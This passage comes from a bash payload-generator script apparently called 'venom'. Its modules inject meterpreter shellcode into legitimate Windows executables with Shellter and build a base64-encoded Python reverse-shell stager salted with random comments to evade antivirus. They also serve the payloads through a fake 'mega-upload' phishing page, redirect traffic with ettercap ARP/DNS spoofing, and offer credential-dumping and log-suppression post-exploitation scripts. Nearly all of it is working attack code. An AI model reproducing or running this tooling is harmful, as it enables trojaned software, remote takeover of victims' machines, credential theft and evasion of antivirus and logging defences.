\"$MsFlF\" = \"ON\" ]; then\n          xterm -T \"PAYLOAD MULTI-HANDLER\" -geometry 124x26 -e \"msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n          xterm -T \"PAYLOAD MULTI-HANDLER\" -geometry 124x26 -e \"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n          fi\n        fi\n   fi\n\n\n# CLEANING EVERYTHING UP\necho \"[☠] Cleanning temp generated files ..\"\nsleep 2\nrm $ApAcHe/$N4m.exe > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\n# cleanup avet old files ..\nrm $IPATH/obfuscate/avet/template.txt > /dev/null 2>&1\nrm $IPATH/obfuscate/avet/defs.h > /dev/null 2>&1\nrm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\nsleep 2\nclear\ncd $IPATH/\n\nelse\n\n  echo ${RedF}[x]${white} Abort module execution ..${Reset};\n  sleep 2\n  sh_microsoft_menu\n  clear\nfi\n}\n\n\n\n\n\n#\n# Shellter dynamic PE injector by: kyREcon\n#\n# HINT: accepts only legit executables and backdoor them with shellcode ..\n# https://nodistribute.com/result/3UgXTM2Jp9 (0/39)\n# https://www.virustotal.com/en/file/efe674192c87df5abce19b4ef7fa0005b7597a3de70d4ca1b34658f949d3df3e/analysis/1498501144/ (1/61)\n#\nsh_shellcode25 () {\n# run module or abort ? \nQuE=$(zenity --question --title=\"☠ Shellter - dynamic PE injector ☠\" --text \"Author: @kyREcon\\nThis module uses Shellter in order to inject shellcode into native Windows applications building trojan horses. (code cave injection)\\n\\nRun shellter module?\" --width 320) > /dev/null 2>&1\nif [ \"$?\" -eq \"0\" ]; then\n\n#\n# checking for wine install ..\n#\nvinho=`which wine`\nif [ \"$?\" -eq \"0\" ]; then\n  echo \"[✔] wine installation found ..\"\n  sleep 2\nelse\n  echo \"[x] wine installation NOT FOUND ..\"\n  sleep 2\n  sudo apt-get install wine\nfi\n\n#\n# checking if shellter its installed ..\n#\nif [ -e \"$IPATH/obfuscate/shellter/shellter.exe\" ]; then\n  echo \"[✔] shellter installation found ..\"\n  sleep 2\nelse\n  echo \"[x] shellter installation NOT FOUND ..\"\n  sleep 2\nfi\n\n  #\n  # config settings needed by shellter ..\n  #\n    echo \"[☠] Enter shellcode settings!\"\n    cd $IPATH/obfuscate/shellter\n    LhOst=$(zenity --title=\"☠ Enter LHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\n    LpOrt=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\n    appl=$(zenity --title \"☠ Shellter - Chose file to be backdoored ☠\" --filename=$IPATH/ --file-selection) > /dev/null 2>&1\n    paylo=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\nAvailable Payloads:\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"meterpreter_reverse_tcp\" FALSE \"meterpreter_reverse_http\" FALSE \"meterpreter_reverse_https\" --width 350 --height 230) > /dev/null 2>&1\n\n\n## setting default values in case user have skip this ..\nif [ -z \"$LhOst\" ]; then LhOst=\"$IP\";fi\nif [ -z \"$LpOrt\" ]; then LpOrt=\"443\";fi\nif [ -z \"$appl\" ]; then echo \"${RedF}[x]${white} This Module Requires one binary.exe input\";sleep 3; sh_exit;fi\n\n   #\n   # grab only the executable name from the full path\n   # ^/ (search for expression) +$ (print only last espression)\n   #\n   echo \"$appl\" > test.txt\n   N4m=`grep -oE '[^/]+$' test.txt` > /dev/null 2>&1\n   rm test.txt > /dev/null 2>&1\n\n\n    #\n    # copy files generated to output folder ..\n    #\n    cp $appl $IPATH/obfuscate/shellter\n    chown $user $N4m > /dev/null 2>&1\n    echo \"[✔] Files Successfully copy to shellter ..\"\n    sleep 2\n\n\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $LpOrt\n    LHOST   : $LhOst\n    PAYLOAD : $paylo\n    AGENT   : $IPATH/output/$N4m\n\n!\n\n  #\n  # in ubuntu distros we can not run shellter.exe in wine with root privs\n  # so we need to run it in the context of a normal user...\n  #\n  su $user -c \"$arch shellter.exe -a -f $N4m --stealth -p $paylo --lhost $LhOst --port $LpOrt\"\n  echo \"\"\n    #\n    # clean recent files ..\n    #\n    rm *.bak > /dev/null 2>&1\n    mv $N4m $IPATH/output > /dev/null 2>&1\n    #\n    # config correct payload arch  ..\n    #\n      if [ \"$paylo\" = \"meterpreter_reverse_tcp\" ]; then\n        msf_paylo=\"windows/meterpreter/reverse_tcp\"\n      elif [ \"$paylo\" = \"meterpreter_reverse_http\" ]; then\n        msf_paylo=\"windows/meterpreter/reverse_http\"\n      elif [ \"$paylo\" = \"meterpreter_reverse_https\" ]; then\n        msf_paylo=\"windows/meterpreter/reverse_https\"\n      else\n        echo ${RedF}[x]${white} Abort module execution ..${Reset};\n        sleep 2\n        sh_menu\n      fi\n\n#\n# CHOSE HOW TO DELIVER YOUR PAYLOAD\n#\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Payload stored:\\n$IPATH/output/$N4m\\n\\nchose how to deliver: $N4m\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 305 --height 220) > /dev/null 2>&1\n\n\n   if [ \"$serv\" = \"multi-handler (default)\" ]; then\n      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n      echo \"[☠] Start a multi-handler...\"\n      echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n      echo \"[☯] Please dont test samples on virus total...\"\n        if [ \"$MsFlF\" = \"ON\" ]; then\n          xterm -T \"PAYLOAD MULTI-HANDLER\" -geometry 124x26 -e \"msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; exploit'\"\n          cd $IPATH/output\n          # delete utf-8/non-ancii caracters from output\n          tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n          sed -i \"s/\\[0m//g\" final.log\n          sed -i \"s/\\[1m\\[34m//g\" final.log\n          sed -i \"s/\\[4m//g\" final.log\n          sed -i \"s/\\[K//g\" final.log\n          sed -i \"s/\\[1m\\[31m//g\" final.log\n          sed -i \"s/\\[1m\\[32m//g\" final.log\n          sed -i \"s/\\[1m\\[33m//g\" final.log\n          mv final.log $N4m-$lhost.log > /dev/null 2>&1\n          rm report.log > /dev/null 2>&1\n          cd $IPATH/\n        else\n          xterm -T \"PAYLOAD MULTI-HANDLER\" -geometry 124x26 -e \"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; exploit'\"\n        fi\n      sleep 2\n\n\n   else\n\n\nP0=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\npost-exploitation module to run\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"sysinfo.rc\" FALSE \"enum_system.rc\" FALSE \"dump_credentials.rc\" FALSE \"fast_migrate.rc\" FALSE \"stop_logfiles_creation.rc\" FALSE \"exploit_suggester.rc\" --width 305 --height 300) > /dev/null 2>&1\n\n  if [ \"$P0\" = \"stop_logfiles_creation.rc\" ]; then\n    #\n    # check if dependencies exist ..\n    #\n    if [ -e \"$pHanTom/post/windows/manage/Invoke-Phant0m.rb\" ]; then\n      echo \"[☠] Invoke-Phant0m.rb installed ..\"\n      sleep 2\n    else\n      echo \"[x] Invoke-Phant0m.rb not found ..\"\n      sleep 2\n      echo \"[☠] copy Invoke-Phant0m.rb to msfdb ..\"\n      sleep 2\n      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1\n      echo \"[☠] Reloading msfdb database ..\"\n      sleep 2\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n    fi\n\n      #\n      # check if Invoke-Phantom.ps1 exists ..\n      #\n      if [ -e \"$IPATH/aux/Invoke-Phant0m.ps1\" ]; then\n        echo \"[☠] Invoke-Phant0m.ps1 found ..\"\n        sleep 2\n        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\n      else\n        echo \"[x] Invoke-Phant0m.ps1 not found ..\"\n        sleep 2\n        echo \"[☠] Please place module in $IPATH/aux folder ..\"\n        sleep 2\n        exit\n      fi\n  fi\n\n\n      # edit files nedded\n      cd $IPATH/templates/phishing\n      cp $InJEc12 mega[bak].html\n      sed \"s|NaM3|$N4m|g\" mega.html > copy.html\n      cp copy.html $ApAcHe/index.html > /dev/null 2>&1\n      cd $IPATH/output\n      cp $N4m $ApAcHe/$N4m > /dev/null 2>&1\n      echo \"[☠] loading -> Apache2Server!\"\n      echo \"---\"\n      echo \"- SEND THE URL GENERATED TO TARGET HOST\"\n\n        if [ \"$D0M4IN\" = \"YES\" ]; then\n        # copy files nedded by mitm+dns_spoof module\n        sed \"s|NaM3|$N4m|\" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html\n        cp $IPATH/output/$N4m $ApAcHe/$N4m\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n          xterm -T \"PAYLOAD MULTI-HANDLER\" -geometry 124x26 -e \"msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n          cd $IPATH/output\n          # delete utf-8/non-ancii caracters from output\n          tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n          sed -i \"s/\\[0m//g\" final.log\n          sed -i \"s/\\[1m\\[34m//g\" final.log\n          sed -i \"s/\\[4m//g\" final.log\n          sed -i \"s/\\[K//g\" final.log\n          sed -i \"s/\\[1m\\[31m//g\" final.log\n          sed -i \"s/\\[1m\\[32m//g\" final.log\n          sed -i \"s/\\[1m\\[33m//g\" final.log\n          mv final.log $N4m-$lhost.log > /dev/null 2>&1\n          rm report.log > /dev/null 2>&1\n          cd $IPATH/\n          else\n          xterm -T \"PAYLOAD MULTI-HANDLER\" -geometry 124x26 -e \"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n          fi\n\n\n        else\n\n\n        echo \"- ATTACK VECTOR: http://$LhOst\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n          xterm -T \"PAYLOAD MULTI-HANDLER\" -geometry 124x26 -e \"msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n          xterm -T \"PAYLOAD MULTI-HANDLER\" -geometry 124x26 -e \"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n          fi\n        fi\n    fi\n\n\n# CLEANING EVERYTHING UP\necho \"[☠] Cleanning temp generated files ..\"\nsleep 2\nrm $ApAcHe/$N4m > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nrm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\nsleep 2\ncd output\nrm *.ini\nclear\ncd $IPATH/\n\nelse\n\n  echo ${RedF}[x]${white} Abort module execution ..${Reset};\n  sleep 2\n  sh_microsoft_menu\n  clear\nfi\n}\n\n\n\n\n\n\n# ------------------------------\n# PYTHON - UUID+BASE64 encoding\n# ------------------------------\nsh_shellcode26 () {\n# run module or abort ? \nQuE=$(zenity --question --title=\"☠ UUID random keys evasion ☠\" --text \"Author: r00t-3xp10it | nullbyte\\nAdding ramdom comments into sourcecode\\nwill help evading AVs signature detection (@nullbite)\\n'a computer can never outsmart a always changing virus'\\n\\nRun uuid module?\" --width 370) > /dev/null 2>&1\nif [ \"$?\" -eq \"0\" ]; then\n# get user input to build shellcode\necho \"[☠] Enter shellcode settings!\"\nlhost=$(zenity --title=\"☠ Enter LHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\nN4m=$(zenity --entry --title \"☠ PAYLOAD NAME ☠\" --text \"Enter payload output name\\nexample: UuidPayload\" --width 300) > /dev/null 2>&1\n\n\n## setting default values in case user have skip this ..\nif [ -z \"$lhost\" ]; then lhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"443\";fi\nif [ -z \"$N4m\" ]; then N4m=\"UuidPayload\";fi\n\necho \"[☠] Loading uuid(@nullbyte) obfuscation module ..\"\nsleep 2\necho \"[☠] Building shellcode -> PYTHON format ..\"\nsleep 2\n# display final settings to user\ncat << !\n\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    LHOST   : $lhost\n    FORMAT  : PYTHON -> MULTI OS\n    PAYLOAD : python/meterpreter/reverse_tcp\n\n\n!\n\n\n# EDITING/BACKUP FILES NEEDED\necho \"[☠] editing/backup files ..\"\nsleep 2\n\n\n#\n# Template ramdom keys ..\n# HINT: adding ramdom comments to source code\n# will help evading AVs signature detection (nullbite) \n# \"a computer can never outsmart a always changing virus\" \n#\nNEW_UUID_1=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)\nNEW_UUID_2=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)\nNEW_UUID_3=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)\nNEW_UUID_4=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)\nNEW_UUID_5=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)\nNEW_UUID_6=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)\n\n\n#\n# Build python Template (random UUID keys)\n#\ncd $IPATH/output\necho \"[✔] Using random UUID keys (evade signature detection)\"\nsleep 2\necho \"\"\necho \"    Generated key:$NEW_UUID_1\"\nsleep 1\necho \"    Generated key:$NEW_UUID_2\"\nsleep 1\necho \"    Generated key:$NEW_UUID_3\"\nsleep 1\necho \"    Generated key:$NEW_UUID_4\"\nsleep 1\necho \"    Generated key:$NEW_UUID_5\"\nsleep 1\necho \"    Generated key:$NEW_UUID_6\"\necho \"\"\nsleep 1\n\n\necho \"[☠] build routine (template.raw) ..\"\nsleep 2\necho \"import socket,struct,time\" > routine\necho \"# $NEW_UUID_1\" >> routine\necho \"for x in range(10):\" >> routine\necho \"# $NEW_UUID_2\" >> routine\necho \"\ttry:\" >> routine\necho \"# $NEW_UUID_3\" >> routine\necho \"\t\ts=socket.socket(2,socket.SOCK_STREAM)\" >> routine\necho \"# $NEW_UUID_4\" >> routine\necho \"\t\ts.connect(('$lhost',$lport))\" >> routine\necho \"# $NEW_UUID_5\" >> routine\necho \"\t\tbreak\" >> routine\necho \"# $NEW_UUID_6\" >> routine\necho \"\texcept:\" >> routine\necho \"# $NEW_UUID_1\" >> routine\necho \"\t\ttime.sleep(5)\" >> routine\necho \"# $NEW_UUID_2\" >> routine\necho \"l=struct.unpack('>I',s.recv(4))[0]\" >> routine\necho \"# $NEW_UUID_3\" >> routine\necho \"d=s.recv(l)\" >> routine\necho \"# $NEW_UUID_4\" >> routine\necho \"while len(d)<l:\" >> routine\necho \"# $NEW_UUID_5\" >> routine\necho \"\td+=s.recv(l-len(d))\" >> routine\necho \"# $NEW_UUID_6\" >> routine\necho \"exec(d,{'s':s})\" >> routine\n\n\n\n#\n# base64 routine encoding\n#\necho \"[☠] base64 routine encoding ..\"\nsleep 2\nenc=`cat routine`\nstore=`echo \"$enc\" | base64 | tr -d '\\n'`\n\n\n\n#\n# build template.py (final agent)\n#\necho \"[☠] build base64 $N4m.py agent ..\"\nsleep 2\necho \"# python  template | Author: r00t-3xp10it\" > $IPATH/output/template.py\necho \"# UUID obfuscation by: nullbyte\" >> $IPATH/output/template.py\necho \"# execute: python $N4m.py\" >> $IPATH/output/template.py\necho \"# ---\" >> $IPATH/output/template.py\necho \"import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('$store')))\" >> $IPATH/output/template.py\n\n\n\n#\n# make the file 'executable' ..\n#\necho \"[☠] make the file 'executable' ..\"\nsleep 2\nmv template.py $N4m.py > /dev/null 2>&1\nchmod +x $N4m.py > /dev/null 2>&1\n\n\n\n#\n# CHOSE HOW TO DELIVER YOUR PAYLOAD\n#\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Payload stored:\\n$IPATH/output/$N4m.py\\n\\nchose how to deliver: $N4m.py\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 305 --height 220) > /dev/null 2>&1\n\n\n   if [ \"$serv\" = \"multi-handler (default)\" ]; then\n      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n      echo \"[☠] Start a multi-handler...\"\n      echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n      echo \"[☯] Please dont test samples on virus total...\"\n        if [ \"$MsFlF\" = \"ON\" ]; then\n          xterm -T \"PAYLOAD MULTI-HANDLER\" -geometry 124x26 -e \"msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit'\"\n          cd $IPATH/output\n          # delete utf-8/non-ancii caracters from output\n          tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n          sed -i \"s/\\[0m//g\" final.log\n          sed -i \"s/\\[1m\\[34m//g\" final.log\n          sed -i \"s/\\[4m//g\" final.log\n          sed -i \"s/\\[K//g\" final.log\n          sed -i \"s/\\[1m\\[31m//g\" final.log\n          sed -i \"s/\\[1m\\[32m//g\" final.log\n          sed -i \"s/\\[1m\\[33m//g\" final.log\n          mv final.log $N4m-$lhost.log > /dev/null 2>&1\n          rm report.log > /dev/null 2>&1\n          cd $IPATH/\n        else\n          xterm -T \"PAYLOAD MULTI-HANDLER\" -geometry 124x26 -e \"msfconsole -x 'use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit'\"\n        fi\n      sleep 2\n\n\n   else\n\n\nP0=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\npost-exploitation module to run\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"sysinfo.rc\" FALSE \"enum_system.rc\" FALSE \"dump_credentials.rc\" FALSE \"fast_migrate.rc\" FALSE \"stop_logfiles_creation.rc\" FALSE \"exploit_suggester.rc\" FALSE \"linux_hostrecon.rc\" FALSE \"dump_credentials_linux.rc\" --width 305 --height 360) > /dev/null 2>&1\n\n\n\n  if [ \"$P0\" = \"stop_logfiles_creation.rc\" ]; then\n    #\n    # check if dependencies exist ..\n    #\n    if [ -e \"$pHanTom/post/windows/manage/Invoke-Phant0m.rb\" ]; then\n      echo \"[☠] Invoke-Phant0m.rb installed ..\"\n      sleep 2\n    else\n      echo \"[x] Invoke-Phant0m.rb not found ..\"\n      sleep 2\n      echo \"[☠] copy Invoke-Phant0m.rb to msfdb ..\"\n      sleep 2\n      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1\n      echo \"[☠] Reloading msfdb database ..\"\n      sleep 2\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n    fi\n\n      #\n      # check if Invoke-Phantom.ps1 exists ..\n      #\n      if [ -e \"$IPATH/aux/Invoke-Phant0m.ps1\" ]; then\n        echo \"[☠] Invoke-Phant0m.ps1 found ..\"\n        sleep 2\n        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\n      else\n        echo \"[x] Invoke-Phant0m.ps1 not found ..\"\n        sleep 2\n        echo \"[☠] Please place module in $IPATH/aux folder ..\"\n        sleep 2\n        exit\n      fi\n\n  elif [ \"$P0\" = \"dump_credentials_linux.rc\" ]; then\n    if [ -e \"$pHanTom/post/linux/gather/wifi_dump_linux.rb\" ]; then\n      echo \"[✔] wifi_dump_linux.rb -> found\"\n      sleep 2\n    else\n      echo \"[x] wifi_dump_linux.rb -> not found\"\n      sleep 1\n      echo \"    copy post-module to msfdb ..\"\n      cp $IPATH/aux/msf/wifi_dump_linux.rb $pHanTom/post/linux/gather/wifi_dump_linux.rb > /dev/null 2>&1\n      echo \"[☠] Reloading msfdb database ..\"\n      sleep 2\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n    fi\n\n  else\n    :\n  fi\n\nif [ \"$P0\" = \"linux_hostrecon.rc\" ]; then\n  if [ -e \"$pHanTom/post/linux/gather/linux_hostrecon.rb\" ]; then\n    echo \"[✔] linux_hostrecon.rb -> found\"\n    sleep 2\n  else\n    echo \"[x] linux_hostrecon.rb -> not found\"\n    sleep 1\n    echo \"[*] copy post-module to msfdb ..\"\n    cp $IPATH/aux/msf/linux_hostrecon.rb $pHanTom/post/linux/gather/linux_hostrecon.rb > /dev/null 2>&1\n    echo \"[☠] Reloading msfdb database ..\"\n    sleep 2\n    xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n    xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n  fi\nfi\n\n\n      # edit files nedded\n      cd $IPATH/templates/phishing\n      cp $InJEc12 mega[bak].html\n      sed \"s|NaM3|$N4m.py|g\" mega.html > copy.html\n      cp copy.html $ApAcHe/index.html > /dev/null 2>&1\n      cd $IPATH/output\n      cp $N4m.py $ApAcHe/$N4m.py > /dev/null 2>&1\n      echo \"[☠] loading -> Apache2Server!\"\n      echo \"---\"\n      echo \"- SEND THE URL GENERATED TO TARGET HOST\"\n\n        if [ \"$D0M4IN\" = \"YES\" ]; then\n        # copy files nedded by mitm+dns_spoof module\n        sed \"s|NaM3|$N4m.py|\" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html\n        cp $IPATH/output/$N4m.py $ApAcHe/$N4m.py\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n          xterm -T \"PAYLOAD MULTI-HANDLER\" -geometry 124x26 -e \"msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n          cd $IPATH/output\n          # delete utf-8/non-ancii caracters from output\n          tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n          sed -i \"s/\\[0m//g\" final.log\n          sed -i \"s/\\[1m\\[34m//g\" final.log\n          sed -i \"s/\\[4m//g\" final.log\n          sed -i \"s/\\[K//g\" final.log\n          sed -i \"s/\\[1m\\[31m//g\" final.log\n          sed -i \"s/\\[1m\\[32m//g\" final.log\n          sed -i \"s/\\[1m\\[33m//g\" final.log\n          mv final.log $N4m-$lhost.log > /dev/null 2>&1\n          rm report.log > /dev/null 2>&1\n          cd $IPATH/\n          else\n          xterm -T \"PAYLOAD MULTI-HANDLER\" -geometry 124x26 -e \"msfconsole -x 'use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n          fi\n\n\n        else\n\n\n        echo \"- ATTACK VECTOR: http://$lhost\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n          xterm -T \"PAYLOAD MULTI-HANDLER\" -geometry 124x26 -e \"msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n          xterm -T \"PAYLOAD MULTI-HANDLER\" -geometry 124x26 -e \"msfconsole -x 'use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n          fi\n        fi\n   fi\n\n\nsleep 2\n# CLEANING EVERYTHING UP\necho \"[☠] Cleanning temp generated files...\"\nrm $ApAcHe/$N4m.py > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nrm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\nrm $IPATH/output/routine > /dev/null 2>&1\nsleep 2\nclear\ncd $IPATH/\n\nelse\n\n  echo ${RedF}[x]${white} Abort module execution ..${Reset};\n  sleep 2\n  